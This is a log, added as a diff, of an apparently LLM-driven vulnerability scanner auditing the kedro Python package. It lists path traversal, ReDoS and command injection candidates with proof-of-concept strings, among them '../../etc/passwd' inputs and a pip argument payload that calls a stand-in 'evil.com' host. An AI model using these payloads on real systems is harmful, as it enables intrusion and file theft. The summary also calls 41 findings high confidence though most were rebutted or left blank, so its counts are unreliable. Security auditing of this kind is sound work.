@@ -1,0 +1,566 @@
+agies — auditing /home/xcy/.local/lib/python3.14/site-packages/kedro
+
+  Languages: JSON, Python, YAML
+  Files: 98
+
+
+Phase A: Path Discovery
+  Backend: tree-sitter
+  Functions: 524
+    Remote Code Execution: 4 sink(s)
+    Local File Inclusion: 14 sink(s)
+    Server-Side Request Forgery: 1 sink(s)
+    SQL Injection: 1 sink(s)
+    Arbitrary File Overwrite: 1 sink(s)
+    ReDoS (Regular Expression DoS): 11 sink(s)
+    Suspicious — requires analysis (path constructor / logic pattern): 2 sink(s)
+
+Phase B: Slice Sorting (34 raw paths)
+  Body-detected orphans: 2 (no call chain)
+  Exploit: 30 + Explore: 15
+    Explore: lfi-000 read score=0.37 (non_std_sink)
+    Explore: rce-001 pipeline score=0.34 (non_std_sink)
+    Explore: rce-002 pipeline score=0.34 (non_std_sink)
+  Project type: app
+
+Phase C: README Understanding
+  No README found.
+  (skipped)
+  Token budget: 1,000,000 tokens
+
+Phase D: Intent+Logic Agents (45 slices)
+  [1/45] afo-000 (_unpack_sdist)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding relies on the assumption that `safe_extract` has 
+bypasses, which is plausible but not proven. The data flow is clear: 
+user-controlled `package_path` reaches `safe_extract`. The lack of validation on
+archive contents and the use of a potentially insufficient guard make the 
+finding hard to disprove without deeper analysis of `safe_extract` 
+implementation.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/afo_safe_extract_function_may__unpack_
+sdist.py
+    ? pattern match, LLM skeptical (2 match(es))
+  [2/45] lfi-001 (_fetch_validate_parse_config_from_file)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is straightforward: user-supplied config_path is 
+passed directly to open() without any path validation or sanitization. The code 
+lacks checks for path traversal, and the attacker controls the input via 
+--config flag. No authentication or access control gates this code path. 
+Exploitation is practical.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/lfi_supply_like__fetch_validate_parse_
+config_from_file_2.py
+    ✓ evidence found (1 match(es))
+      PoC: kedro new --config ../../etc/passwd...
+  [3/45] rce-002 (_describe_git)
+    ✓ 2/10 — safe
+    ? pattern match, LLM skeptical (8 match(es))
+  [4/45] redos-003 (_check_module_path)
+    ? 10/10 — interesting
+    ⚠ BODY_ONLY -- rebuttal overridden (body evidence, no call chain)
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/redos_regex_pattern_hardcoded_as__chec
+k_module_path_3.py
+    ? pattern match, LLM skeptical (1 match(es))
+  [5/45] sqli-004 (_create_cell_with_text)
+    ✓ 0/10 — safe
+    ? pattern match, LLM skeptical (2 match(es))
+  [6/45] ssrf-005 (_get_latest_starters_version)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The sink function `_get_latest_starters_version` uses a hardcoded 
+URL `https://api.github.com/repos/kedro-org/kedro-starters/releases/latest`. No 
+user-controlled data reaches the URL or its parameters. The only configurable 
+aspect is the `Authorization` header via the `GITHUB_TOKEN` environment 
+variable, which is not user-controlled in the context of this CLI tool. 
+Therefore, SSRF is not exploitable.
+    ? pattern match, LLM skeptical (2 match(es))
+  [7/45] suspicious-006 (_is_relative_path)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The finding is not exploitable. All operations are confined to 
+trusted project files. The `call` function uses a fixed command list with no 
+user-controlled arguments. Path operations use `Path` objects and only operate 
+within the project directory. The `_convert_paths_to_absolute_posix` function 
+only processes known config keys and validates that the project path is 
+absolute. No untrusted input reaches any sensitive sink.
+  [8/45] redos-007 (_validate_input_with_regex_pattern)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The regex patterns are hardcoded and do not contain nested 
+quantifiers or overlapping alternations. User input is the string being matched,
+not the pattern itself. The patterns are simple and bounded, e.g., 
+'project_name' uses '^[\w -]{2,}$' which is linear. No ReDoS vulnerability 
+exists.
+    ? pattern match, LLM skeptical (1 match(es))
+  [9/45] redos-008 (validate)
+    ✓ 0/10 — safe
+  [10/45] redos-009 (_validate_selected_tools)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex pattern `r"\s"` is hardcoded and simple, matching any 
+single whitespace character. It contains no nested quantifiers, alternations, or
+user-controlled components. The input is split by comma and validated against a 
+fixed whitelist. No ReDoS vulnerability exists. See `_validate_selected_tools` 
+at line 232.
+    ? pattern match, LLM skeptical (1 match(es))
+  [11/45] redos-010 (get_pkg_version)
+    ⚠ 10/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly 
+concatenates user-controlled package_name into a regex pattern without 
+sanitization, and the attacker can control both the pattern and the input file. 
+The static analysis confirms the data flow from entry to sink, and there is no 
+validation or timeout to prevent ReDoS.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/redos_supply_malicious_regex_pattern_g
+et_pkg_version.py
+    ✓ evidence found (1 match(es))
+      PoC: package_name = '(a+)+b'; reqs_path = '/tmp/evil_requirements.txt' 
+with content 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac'...
+  [12/45] rce-011 (call)
+    ⚠ 8/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the `package_path` is 
+user-controlled and directly passed to `pip download` without sanitization, 
+allowing injection of pip options like `--extra-index-url` that can lead to 
+arbitrary code execution. The developer intent does not address this risk, and 
+the guards (safe_extract, pip flags) do not prevent the injection.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/rce_call_function_executes_subprocess_
+call.py
+    ✓ evidence found (3 match(es))
+      PoC: 1. Create a malicious PyPI package that executes code on install 
+(e.g., via setup.py).
+2. Host it on a custom index or use a public one.
+3. Run: `kedr...
+  [13/45] redos-012 (list)
+    ? 8/10 — interesting
+    ✗ rebutted
+      reason: The finding is not exploitable because the regex in 
+`DataCatalog.list()` is never supplied by an untrusted user from the 
+`package_micropkg` entry point. The taint path shown in the structured evidence 
+is logically broken: the `list` method is called with a hardcoded or trusted 
+regex, not user input. The `call` function executes a fixed subprocess command, 
+and `run` processes pipeline nodes without external regex. The 
+`_outputs_to_dictionary` and `_from_dict` functions do not use regex at all. No 
+user-controlled data reaches the `re.compile()` sink. The developer intent and 
+actual code confirm that the regex is provided by the project developer, not an 
+attacker.
+    ? pattern match, LLM skeptical (1 match(es))
+  [14/45] lfi-013 (_remove_from_file)
+    ✓ 1/10 — safe
+    ? pattern match, LLM skeptical (2 match(es))
+  [15/45] lfi-014 (_remove_from_toml)
+    ✓ 0/10 — safe
+    ? pattern match, LLM skeptical (2 match(es))
+  [16/45] lfi-015 (_remove_extras_from_kedro_datasets)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The sink function _remove_extras_from_kedro_datasets receives 
+file_path from callers setup_template_tools, which passes requirements_file_path
+and pyproject_file_path. These paths are derived from the template directory 
+(current_dir) and are not influenced by any user input. The entry point main() 
+does not accept user parameters; it uses package_name from the file system and 
+calls find_run_command. There is no data flow from untrusted sources to the 
+file_path parameter. Therefore, path traversal is not possible.
+    ? pattern match, LLM skeptical (2 match(es))
+  [17/45] lfi-016 (sort_requirements)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The sink function sort_requirements is called with 
+requirements_file_path, which originates from internal template paths (e.g., 
+Path(__file__).parent / 'requirements.txt'). No user input reaches this sink. 
+The entry function main derives package_name from __file__ (a fixed path) and 
+calls internal functions that do not accept user-controlled file paths. There is
+no data flow from untrusted input to the sink, making path traversal impossible.
+    ? pattern match, LLM skeptical (1 match(es))
+  [18/45] lfi-017 (_prepare_imports)
+    ✓ 2/10 — safe
+    ? pattern match, LLM skeptical (1 match(es))
+  [19/45] lfi-018 (_add_missing_datasets_to_catalog)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims LFI (Local File Inclusion) but the sink is a 
+write operation (catalog_path.open(mode='w')), not a read. No arbitrary file 
+read is possible. The write path is confined to 
+<project_path>/<CONF_SOURCE>/<env>/catalog_<pipeline_name>.yml, and while env 
+and pipeline_name are user-controlled, the write does not allow reading 
+sensitive files. The read of existing catalog (catalog_path.read_text()) uses 
+the same constructed path, but that read is limited to the specific catalog 
+file, not arbitrary files. Therefore, no LFI vulnerability exists.
+    ? pattern match, LLM skeptical (2 match(es))
+  [20/45] lfi-019 (_get_prompts_required_and_clear_from_CLI_provided)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims path traversal to arbitrary files, but the sink
+reads a hardcoded filename 'prompts.yml' (line 476). Even if `cookiecutter_dir` 
+is user-controlled, the attacker cannot read arbitrary files; they can only read
+that specific file within the directory. The directory is created from a 
+template, so controlling its contents is a supply chain issue, not path 
+traversal. No arbitrary file read is possible.
+    ? pattern match, LLM skeptical (1 match(es))
+  [21/45] lfi-020 (_create_project)
+    ⚠ 8/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly 
+passes user-controlled `template_path` to `cookiecutter()` without validation, 
+and the intermediate functions do not sanitize path traversal sequences. The 
+developer's intent to allow flexible paths does not mitigate the lack of input 
+validation.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/lfi_cli_provided__create_project.py
+    ✓ evidence found (1 match(es))
+      PoC: kedro new --starter ../../etc/passwd...
+  [22/45] lfi-021 (load_and_merge_dir_config)
+    ✓ 0/10 — safe
+    ? pattern match, LLM skeptical (2 match(es))
+  [23/45] redos-022 (_assert_pkg_name_ok)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex patterns '^[a-zA-Z_]' and '^\w+$' are simple, 
+linear-time patterns with no nested quantifiers or overlapping alternations. 
+They cannot cause catastrophic backtracking. The input is user-controlled, but 
+the regex itself is safe. No ReDoS vulnerability exists.
+    ? pattern match, LLM skeptical (2 match(es))
+  [24/45] redos-023 (__init__)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The finding claims a ReDoS vulnerability, but the sink function 
+`rich.traceback.install` does not perform regex pattern matching. The `suppress`
+parameter accepts a list of modules/paths, not regex patterns. No regex, glob, 
+or pattern matching operations are present in the code path. Therefore, ReDoS is
+not applicable.
+  [25/45] lfi-024 (_append_package_reqs)
+    ? 8/10 — interesting
+    ✗ rebutted
+      reason: The sink function _append_package_reqs uses requirements_txt = 
+metadata.project_path / 'requirements.txt', which is a fixed path under the 
+project directory. The user-controlled package_path is only used for extraction 
+and metadata reading, not for constructing the sink file path. Therefore, no 
+path traversal is possible to this sink.
+    ? pattern match, LLM skeptical (3 match(es))
+  [26/45] lfi-025 (save)
+    ? 8/10 — interesting
+    ✗ rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+the actual code shows that the destination path is normalized via 
+Path(destination).resolve() before being used in the subprocess command. The 
+subprocess command is hardcoded and does not include user-controlled file paths.
+The module_path is used only to locate source files and is not passed to the 
+subprocess. Therefore, no path traversal vulnerability exists.
+  [27/45] redos-026 (_sub_nonword_chars)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex pattern WORDS_REGEX_PATTERN is a fixed constant (likely 
+r'\W+'), not user-controllable. The sink function _sub_nonword_chars uses this 
+simple pattern without nested quantifiers or overlapping alternations, making 
+ReDoS impossible. The input dataset_name may be user-controlled, but the regex 
+itself is safe. No vulnerability exists.
+    ? pattern match, LLM skeptical (2 match(es))
+  [28/45] redos-027 (_parse_filepath)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex patterns in _parse_filepath (lines 777-778) are 
+'^[a-zA-Z]:[\\/]' and '^[a-zA-Z0-9]+://'. Both are simple, linear-time patterns 
+with no nested quantifiers or overlapping alternations. They cannot cause 
+catastrophic backtracking. The input is user-controlled, but the regexes are 
+inherently safe. No ReDoS vulnerability exists.
+    ? pattern match, LLM skeptical (4 match(es))
+  [29/45] redos-028 (_specificity)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex `\{.*?\}` in `_specificity` (line 402) is a simple 
+non-greedy pattern that does not contain nested quantifiers or overlapping 
+alternations, making it safe against ReDoS. More importantly, the `pattern` 
+argument originates from `self._dataset_patterns` or `self._default_pattern`, 
+which are set during catalog initialization from project configuration files 
+(e.g., catalog.yml), not from user input. The call chain shows no untrusted data
+reaches this sink. Therefore, no ReDoS vulnerability exists.
+    ? pattern match, LLM skeptical (1 match(es))
+  [30/45] suspicious-029 (_convert_paths_to_absolute_posix)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✗ rebutted
+      reason: The finding claims command injection via shell metacharacters or 
+argument injection in `subprocess.run`. However, `subprocess.run` is called with
+a list (`cmd`), not a shell string, which prevents shell injection. The 
+`package_path` is passed as a single argument to `pip download`. While pip may 
+interpret options starting with '--', the `package_path` is the last positional 
+argument after `--dest`, so any '--' prefix would be treated as a positional 
+argument (the package name/URL), not an option. Pip's argument parser does not 
+allow injecting arbitrary options after the positional argument in this context.
+Additionally, the `package_path` is validated earlier: it must be a valid 
+package path (e.g., a URL or local path) and is used in a `pip download` command
+that only downloads source distributions. No evidence of practical exploitation 
+exists.
+  [31/45] lfi-000 (read)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+the sink `open` is called on paths constructed from `self.conf_source` and glob 
+patterns, both of which are set during initialization and not user-controllable.
+The only user-controlled input is `key`, which is validated against 
+`self.config_patterns` (line 175-177). The paths are built by joining 
+`conf_source` with `base_env` or `run_env` (lines 192, 204), which are also not 
+user-controlled. The glob patterns are applied within the base directory, and 
+hidden files are skipped. No untrusted input reaches the file path construction.
+The data flow trace shows `key` as entry, but it is only used to select 
+predefined patterns, not to construct paths directly. Therefore, the 
+vulnerability is not exploitable.
+    ? pattern match, LLM skeptical (2 match(es))
+  [32/45] rce-001 (pipeline)
+    ✓ 0/10 — safe
+  [33/45] rce-002 (pipeline)
+    ✓ 2/10 — safe
+  [34/45] lfi-003 (read)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+the sink `open` receives paths constructed from `self.conf_source` (fixed) and 
+predefined patterns. User input `key` only selects which predefined pattern set 
+to use, and does not appear in the file path. The glob operation restricts files
+to within the base directory. No untrusted data reaches the sink. Line evidence:
+`base_path = str(Path(self.conf_source) / self.base_env)` and `env_path = 
+str(Path(self.conf_source) / run_env)` use fixed `self.conf_source`. Patterns 
+are from `self.config_patterns[key]`, which is a dictionary set during 
+initialization, not user-controlled.
+    ? pattern match, LLM skeptical (2 match(es))
+  [35/45] lfi-004 (_remove_extras_from_kedro_datasets)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The sink function _remove_extras_from_kedro_datasets receives 
+file_path from internal template generation, not user input. The entry function 
+main derives package_name from __file__ (a fixed path within the installed 
+package), and all subsequent calls operate on internal template files. No 
+untrusted data reaches the sink. The data flow annotations confirm no 
+user-controlled parameters exist.
+    ? pattern match, LLM skeptical (2 match(es))
+  [36/45] lfi-005 (sort_requirements)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The sink function sort_requirements receives a path derived from 
+internal template paths, not user input. The entry function main uses 
+package_name from Path(__file__).parent.name, which is a fixed internal path. No
+user-controlled data reaches the sink. The data flow annotations confirm no 
+untrusted input is involved. Therefore, no path traversal vulnerability exists.
+    ? pattern match, LLM skeptical (1 match(es))
+  [37/45] lfi-006 (_prepare_imports)
+    ✓ 2/10 — safe
+    ? pattern match, LLM skeptical (1 match(es))
+  [38/45] lfi-007 (_add_missing_datasets_to_catalog)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly uses
+user-controlled `env` and `pipeline_name` in path construction via pathlib's `/`
+operator without any sanitization or validation. The sink (`catalog_path.open`) 
+performs file read/write operations, enabling path traversal. The developer's 
+intent assumes safe input, but no enforcement exists.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/lfi_cli_arguments__add_missing_dataset
+s_to_catalog.py
+    ✓ evidence found (2 match(es))
+      PoC: kedro catalog create --env ../../tmp --pipeline-name malicious...
+  [39/45] lfi-008 (_get_prompts_required_and_clear_from_CLI_provided)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly uses
+user-supplied `starter_alias` as `template_path` without sanitization, and the 
+path is used to open `prompts.yml`. The data flow is clear and no validation 
+blocks path traversal.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/lfi_sink_opens_prompts__get_prompts_re
+quired_and_clear_from_CLI_provided.py
+    ✓ evidence found (1 match(es))
+      PoC: kedro new --starter ../../../etc/passwd...
+  [40/45] lfi-009 (_create_project)
+    ⚠ 9/10 — 1 contradiction(s)
+    ✓ not rebutted
+      weak point: The finding is hard to disprove because the code directly 
+passes user-controlled `template_path` to `cookiecutter()` without any 
+sanitization, and `cookiecutter` accepts local paths with traversal sequences. 
+The data flow is clear and the sink is reachable via the `--starter` flag.
+    📄 PoC: 
+/home/xcy/workSpace/code-agies/pocs/kedro/lfi_traversal_protection__create_proje
+ct.py
+    ✓ evidence found (1 match(es))
+      PoC: kedro new --starter ../../etc/passwd...
+  [41/45] lfi-010 (load_and_merge_dir_config)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims path traversal in path-builder functions, but 
+the sink `open` is called on paths derived from `self._fs.glob()` results, which
+are restricted to the base directory constructed from `self.conf_source` and 
+environment names (e.g., `Path(self.conf_source) / self.base_env`). These base 
+paths are set during initialization and are not user-controllable. The `key` 
+parameter only selects predefined glob patterns from `self.config_patterns`, 
+which are also not user-controlled. No untrusted input influences the file 
+paths. The data flow trace shows no taint from user input to the sink. 
+Therefore, the vulnerability is not exploitable.
+    ? pattern match, LLM skeptical (2 match(es))
+  [42/45] redos-011 (_assert_pkg_name_ok)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The regex patterns '^[a-zA-Z_]' and '^\w+$' are simple, 
+non-nested, and do not contain any quantifiers that could cause catastrophic 
+backtracking. They are linear-time and safe. No ReDoS vulnerability exists.
+    ? pattern match, LLM skeptical (2 match(es))
+  [43/45] redos-012 (__init__)
+    ? 10/10 — interesting
+    ✗ rebutted
+      reason: The finding claims a ReDoS vulnerability, but the sink function 
+`rich.traceback.install` does not perform any regex matching. The `suppress` 
+parameter is a list of module objects and paths, not regex patterns. 
+User-controlled input from `kwargs` is added to this list, but it is never used 
+in a regex or glob operation. The rich library uses these values to suppress 
+traceback frames by comparing module names or paths, not by pattern matching. 
+Therefore, no ReDoS is possible.
+  [44/45] lfi-013 (_append_package_reqs)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The sink function _append_package_reqs writes to a path derived 
+from metadata.project_path, which is a project-internal path and not 
+user-controlled. The user-controlled package_path is used only for extraction 
+and does not influence the sink path. Therefore, no path traversal vulnerability
+exists.
+    ? pattern match, LLM skeptical (3 match(es))
+  [45/45] lfi-014 (save)
+    ? 9/10 — interesting
+    ✗ rebutted
+      reason: The finding claims LFI via path traversal in the `call` sink, but 
+the destination path is only used as an output directory argument to `python -m 
+build --outdir`. No file read operation occurs based on user input. The `call` 
+function executes a trusted command with a resolved absolute path, and the build
+tool writes files to that directory. There is no path traversal vulnerability 
+because the sink does not read files. The prior knowledge flags about LFI in 
+`call` refer to a different code path (`_unpack_sdist`) not present in this 
+chain.
+
+Phase E: Results
+  Blackboard: 19 cached intents, 182 knowledge entries, 41 phase results
+  High confidence (41):
+    afo-000: safe_extract — logic_gap
+      An attacker can craft a tar.gz file with an entry named 
+`../../../etc/cron.d/evil` or a symlink to `/etc/passwd`. When `safe_extract` is
+called, if it does not properly reject such paths, the file will be written 
+outside the intended directory, overwriting critical system files.
+    lfi-001: open — logic_gap
+      kedro new --config ../../etc/passwd
+    rce-002: ? — ?
+      
+    redos-003: ? — ?
+      
+    sqli-004: ? — ?
+      
+    ssrf-005: ? — ?
+      
+    redos-007: ? — ?
+      
+    redos-009: ? — ?
+      
+    redos-010: re.compile — logic_gap
+      package_name = '(a+)+b' and a requirements file containing a line with 
+many 'a's (e.g., 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac') will cause 
+exponential backtracking.
+    rce-011: subprocess.run — logic_gap
+      
+    redos-012: ? — ?
+      
+    lfi-013: ? — ?
+      
+    lfi-014: ? — ?
+      
+    lfi-015: ? — ?
+      
+    lfi-016: ? — ?
+      
+    lfi-017: ? — ?
+      
+    lfi-018: ? — ?
+      
+    lfi-019: ? — ?
+      
+    lfi-020: cookiecutter — logic_gap
+      Use `--starter ../../etc/passwd` to read arbitrary files if cookiecutter 
+supports local paths, or use a remote URL to fetch malicious templates.
+    lfi-021: ? — ?
+      
+    redos-022: ? — ?
+      
+    lfi-024: ? — ?
+      
+    redos-026: ? — ?
+      
+    redos-027: ? — ?
+      
+    redos-028: ? — ?
+      
+    suspicious-029: call — logic_gap
+      An attacker provides a package_path like 'http://evil.com/pkg.tar.gz && 
+echo pwned' or '--extra-index-url http://evil.com' to inject commands. Since the
+package_path is used in a subprocess call to pip, the attacker can execute 
+arbitrary commands on the system.
+    lfi-000: ? — ?
+      
+    lfi-003: ? — ?
+      
+    lfi-004: ? — ?
+      
+    lfi-005: ? — ?
+      
+    lfi-006: ? — ?
+      
+    lfi-007: catalog_path.open — logic_gap
+      kedro catalog create --env ../../tmp --pipeline-name malicious
+    lfi-008: prompts_yml.open — logic_gap
+      --starter ../../../etc/passwd
+    lfi-009: cookiecutter — logic_gap
+      kedro new --starter ../../etc/passwd
+    lfi-010: ? — ?
+      
+    redos-011: ? — ?
+      
+    lfi-013: ? — ?
+      
+
+Pipeline Complete
+  Target: /home/xcy/.local/lib/python3.14/site-packages/kedro
+  Model: deepseek-chat
+  Duration: 852.4s
+  Paths discovered: 34
+  Slices analyzed: 45
+  Findings: 41 high, 0 interesting
+  Tokens: 558,664 total (479,911 prompt + 78,753 completion)
+
+  Recommended verification targets:
+    AFO afo-000: Code-level pattern evidence (2 matches): 
+?:safe_extract(tar_file, destination); ?:safe_extract(fs_fi
+    LFI lfi-001: The user-supplied --config flag is passed as config_path to the
+new function (line 310). It is then 
+    RCE rce-002: Code-level pattern evidence (8 matches): ?:**kwargs: Optional 
+keyword arguments passed to `subproces
+    REDOS redos-003: Code-level pattern evidence (1 matches): ?:if value and not
+re.match(r"^[\w.]+$", value):
+    SQLI sqli-004: Code-level pattern evidence (2 matches): 
+?:app.commands.execute("notebook:insert-cell-below"); ?:app
+
+v3 CodeQL pipeline complete.
+Traceback (most recent call last):
+  File "<string>", line 20, in <module>
+    asyncio.run(run())
+    ~~~~~~~~~~~^^^^^^^
+  File "/usr/lib/python3.14/asyncio/runners.py", line 204, in run
+    return runner.run(main)
+           ~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.14/asyncio/runners.py", line 127, in run
+    return self._loop.run_until_complete(task)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.14/asyncio/base_events.py", line 719, in run_until_complete
+    return future.result()
+           ~~~~~~~~~~~~~^^
+  File "<string>", line 9, in run
+    result = await run_audit(target=td, model='deepseek-chat', v3=True)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: 'NoneType' object can't be awaited
